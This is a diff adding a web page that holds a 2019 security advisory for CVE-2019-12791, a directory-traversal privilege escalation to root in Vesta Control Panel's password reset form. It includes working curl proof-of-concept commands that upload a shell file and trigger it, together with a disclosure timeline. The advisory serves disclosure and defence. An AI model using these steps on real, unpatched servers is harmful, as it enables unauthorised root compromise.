@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+
+        <title>[CVE-2019-12791] Vesta Control Panel 0.9.8-24 — Privilege escalation in the password reset form</title>
+
+        
+        <meta name="description" content="Privilege escalation to root can be achieved by a regular user via the password reset form exploiting a directory traversal vulnerability.">
+        
+
+        <meta name="twitter:card" content="summary">
+        <meta name="twitter:site" content="@cyrus_and">
+        <meta property="og:url" content="https://cardaci.xyz/advisories/2019/08/12/vesta-control-panel-0.9.8-24-privilege-escalation-in-the-password-reset-form/">
+        <meta property="og:title" content="[CVE-2019-12791] Vesta Control Panel 0.9.8-24 — Privilege escalation in the password reset form">
+        <meta property="og:image" content="https://cardaci.xyz/assets/img/icon.png">
+        
+        <meta property="og:description" content="Privilege escalation to root can be achieved by a regular user via the password reset form exploiting a directory traversal vulnerability.">
+        
+
+        <link type="application/atom+xml" rel="alternate" href="https://cardaci.xyz/feed.xml" title="Andrea Cardaci" />
+
+        <link rel="icon" href="/assets/img/icon.png">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
+        <meta name="theme-color" content="#000000">
+
+        
+
+        <link rel="stylesheet" href="/assets/css/post.css" type="text/css" media="screen"/>
+        <link rel="stylesheet" href="/assets/css/print.css" type="text/css" media="print"/>
+    </head>
+    <body>
+        <div id="header">
+    <a href="/">Home</a>
+    #
+    
+
+
+<a href="/advisories/2019/08/12/vesta-control-panel-0.9.8-24-privilege-escalation-in-the-password-reset-form/">Permalink</a>
+<a title="Share on Twitter" href="https://twitter.com/intent/tweet?text=%5BCVE-2019-12791%5D+Vesta+Control+Panel+0.9.8-24+%E2%80%94+Privilege+escalation+in+the+password+reset+form%0A%0Ahttps%3A%2F%2Fcardaci.xyz%2Fadvisories%2F2019%2F08%2F12%2Fvesta-control-panel-0.9.8-24-privilege-escalation-in-the-password-reset-form%2F">Twitter</a>
+<a title="Share on Facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fcardaci.xyz%2Fadvisories%2F2019%2F08%2F12%2Fvesta-control-panel-0.9.8-24-privilege-escalation-in-the-password-reset-form%2F">Facebook</a>
+<a title="Share on LinkedIn" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fcardaci.xyz%2Fadvisories%2F2019%2F08%2F12%2Fvesta-control-panel-0.9.8-24-privilege-escalation-in-the-password-reset-form%2F&title=%5BCVE-2019-12791%5D+Vesta+Control+Panel+0.9.8-24+%E2%80%94+Privilege+escalation+in+the+password+reset+form">LinkedIn</a>
+
+</div>
+
+<div id="container">
+    <h1>[CVE-2019-12791] Vesta Control Panel 0.9.8-24 — Privilege escalation in the password reset form</h1>
+    <p id="post-info">Andrea Cardaci — 12 August 2019</p>
+    
+    
+    <table id="advisory-header">
+  <thead>
+    <tr>
+      <th style="text-align: right"> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: right"><strong>Discovered</strong></td>
+      <td>2019-04-17</td>
+    </tr>
+    <tr>
+      <td style="text-align: right"><strong>Author</strong></td>
+      <td><a href="mailto:cyrus.and@gmail.com">Andrea Cardaci</a></td>
+    </tr>
+    <tr>
+      <td style="text-align: right"><strong>Product</strong></td>
+      <td><a href="https://vestacp.com/">Vesta Control Panel</a></td>
+    </tr>
+    <tr>
+      <td style="text-align: right"><strong>Tested versions</strong></td>
+      <td>0.9.8-24</td>
+    </tr>
+    <tr>
+      <td style="text-align: right"><strong>CVE</strong></td>
+      <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12791">CVE-2019-12791</a></td>
+    </tr>
+  </tbody>
+</table>
+
+    
+    <h2 id="abstract">Abstract</h2>
+
+<p>The insufficient input sanitization used by the <code class="language-plaintext highlighter-rouge">v-list-user</code> shell utility allows to perform directory traversal and execute shell files as <code class="language-plaintext highlighter-rouge">root</code> anywhere in the file system but with a fixed file name.</p>
+
+<p>This coupled with the legitimate ability of registered users to upload files in certain locations on the server grants an attacker the ability to perform privilege escalation from a registered user to <code class="language-plaintext highlighter-rouge">root</code> by simply requesting a password reset.</p>
+
+<p><a href="https://www.hestiacp.com/">HestiaCP</a> (an actively maintained fork of VestaCP) version 1.0.4 is also vulnerable but a fix has been promptly deployed in version 1.0.5.</p>
+
+<h2 id="details">Details</h2>
+
+<p>The <code class="language-plaintext highlighter-rouge">v-list-user</code> script accepts an user name as an argument then evaluates the <code class="language-plaintext highlighter-rouge">$VESTA/data/users/$user/user.conf</code> file and prints some values:<sup id="fnref:vesta-variable" role="doc-noteref"><a href="#fn:vesta-variable" class="footnote" rel="footnote">1</a></sup></p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">source</span> <span class="nv">$VESTA</span>/data/users/<span class="nv">$user</span>/user.conf
+</code></pre></div></div>
+
+<p>The only check that is performed against the user name is <code class="language-plaintext highlighter-rouge">is_object_valid 'user' 'USER' "$user"</code> which basically checks that the path <code class="language-plaintext highlighter-rouge">$VESTA/data/users/$user</code> is a valid directory. So if <code class="language-plaintext highlighter-rouge">../../../../../tmp</code> is passed as user name then the file <code class="language-plaintext highlighter-rouge">/tmp/user.conf</code> is evaluated.<sup id="fnref:any-writable" role="doc-noteref"><a href="#fn:any-writable" class="footnote" rel="footnote">2</a></sup></p>
+
+<p>A registered user can upload files on the server using the <code class="language-plaintext highlighter-rouge">/upload/</code> endpoint. The following is used to upload the proof script to <code class="language-plaintext highlighter-rouge">/tmp/user.conf</code>:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nv">PHPSESSID</span><span class="o">=</span>... <span class="c"># grab it from an authenticated regular user session</span>
+<span class="gp">$</span><span class="w"> </span><span class="nv">COMMAND</span><span class="o">=</span><span class="s1">'id &gt; /usr/local/vesta/web/proof'</span>
+<span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$COMMAND</span><span class="s2">"</span> | curl <span class="nt">-sk</span> <span class="nt">-o</span> /dev/null <span class="se">\</span>
+    <span class="s1">'https://target.com:8083/upload/?dir=/tmp'</span> <span class="se">\</span>
+    <span class="nt">-b</span> <span class="s2">"PHPSESSID=</span><span class="nv">$PHPSESSID</span><span class="s2">"</span> <span class="se">\</span>
+    <span class="nt">-F</span> <span class="s1">'files=@-;filename=user.conf'</span>
+</code></pre></div></div>
+
+<p>It is then possible to invoke the <code class="language-plaintext highlighter-rouge">v-list-user</code> utility by requesting a password reset:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-k</span> https://target.com:8083/reset/ <span class="nt">-d</span> <span class="s1">'user=../../../../../tmp'</span>
+</code></pre></div></div>
+
+<p>In VestaCP the web server is run by the <code class="language-plaintext highlighter-rouge">admin</code> user and the password reset page executes the <code class="language-plaintext highlighter-rouge">v-list-user</code> script with <code class="language-plaintext highlighter-rouge">sudo</code> thus the <code class="language-plaintext highlighter-rouge">user.conf</code> is evaluated by <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<p>Check that the proof file is created in the web server root:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-k</span> https://target.com:8083/proof
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre></div></div>
+
+<h2 id="timeline">Timeline</h2>
+
+<dl>
+  <dt>2019-05-28</dt>
+  <dd>Disclosed to the VestaCP team.</dd>
+  <dt>2019-06-10</dt>
+  <dd>MITRE assigns <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12791">CVE-2019-12791</a> to this vulnerability.</dd>
+  <dt>2019-07-29</dt>
+  <dd>Final warning via <a href="https://github.com/serghey-rodin/vesta/issues/1921">GitHub issue</a> since emails have been ignored.</dd>
+  <dt>2019-07-30</dt>
+  <dd>The VestaCP author asks one more week to fix the issue and publish a new release.</dd>
+  <dt>2019-07-31</dt>
+  <dd>The VestaCP team <a href="https://github.com/serghey-rodin/vesta/commit/bb44f4197b4e5de219bc00197f89517c7e92bc2a">fixes</a> the vulnerability.</dd>
+  <dt>2019-08-15</dt>
+  <dd>The VestaCP team <a href="https://github.com/serghey-rodin/vesta/commit/868dd8b146e76ea3c83c26855ae2f60b22d989d2">releases</a> version 0.9.8-25.</dd>
+</dl>
+<div class="footnotes" role="doc-endnotes">
+  <ol>
+    <li id="fn:vesta-variable" role="doc-endnote">
+      <p><code class="language-plaintext highlighter-rouge">$VESTA</code> is usually set to <code class="language-plaintext highlighter-rouge">/usr/local/vesta/</code>. <a href="#fnref:vesta-variable" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:any-writable" role="doc-endnote">
+      <p>Any other writable location can be used, e.g., the user home directory. <a href="#fnref:any-writable" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+  </ol>
+</div>
+
+</div>
+
+<script>
+ // add permalink on headings
+ document.querySelectorAll('h2, h3, h4, h5, h5').forEach((heading) => {
+     const link = document.createElement('a');
+     link.className = 'permalink';
+     link.href = `#${heading.id}`;
+     heading.appendChild(link);
+ });
+
+ // add download links (add the following after the block {: download="filename.ext"})
+ document.querySelectorAll('div[download]').forEach((node) => {
+     const name = node.getAttribute('download');
+     const blob = new Blob([node.innerText]);
+     const span = document.createElement('span');
+     span.className = 'download-label';
+     span.appendChild(document.createTextNode(name));
+     node.prepend(span);
+     const a = document.createElement('a');
+     a.setAttribute('href', URL.createObjectURL(blob));
+     a.setAttribute('download', name);
+     a.appendChild(document.createTextNode(name));
+     node.prepend(a);
+ });
+</script>
+
+        <div id="footer">
+            Andrea Cardaci &copy; 2021. All rights reserved (unless explicitly stated otherwise).
+
+        </div>
+    </body>
+</html>
